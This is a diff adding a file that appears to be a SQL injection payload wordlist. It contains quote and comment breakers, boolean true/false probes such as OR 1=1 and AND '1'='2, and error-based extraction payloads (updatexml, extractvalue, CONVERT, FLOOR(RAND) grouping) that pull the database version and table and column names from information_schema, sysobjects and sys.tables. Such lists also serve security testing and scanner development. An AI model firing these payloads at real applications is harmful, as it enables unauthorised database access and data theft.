@@ -1,0 +1,44 @@
+'
+''
+" 
+"'
+)
+)--
+'--
+"--
+')--
+")--
+AND 1=1
+AND 1=2
+AND '1'='1
+AND '1'='2
+AND 1=CONVERT(int, (SELECT @@version))
+AND 1=CAST((SELECT @@version) AS INT)
+AND (SELECT 1 FROM dual WHERE 1=1)
+AND (SELECT 1 FROM dual WHERE 1=2)
+AND (SELECT COUNT(*) FROM users)
+AND (SELECT 1/0)
+AND (SELECT updatexml(1,concat(0x7e,(version())),1))
+AND (SELECT extractvalue(1,concat(0x7e,(version()))))
+AND (SELECT name FROM sysobjects WHERE xtype='U')
+AND (SELECT top 1 name FROM sys.tables)
+AND (SELECT table_name FROM information_schema.tables)
+AND (SELECT column_name FROM information_schema.columns)
+AND (SELECT NULL IF(1=1,1,(SELECT table_name FROM information_schema.tables)))
+AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)
+OR '1'='1
+OR '1'='2
+OR "1"="1
+OR "1"="2
+OR 1=1
+OR 1=2
+OR 1=1--
+OR 1=2--
+OR 1=1#
+OR 1=1/*
+OR 'x'='x
+') OR ('x')=('x
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
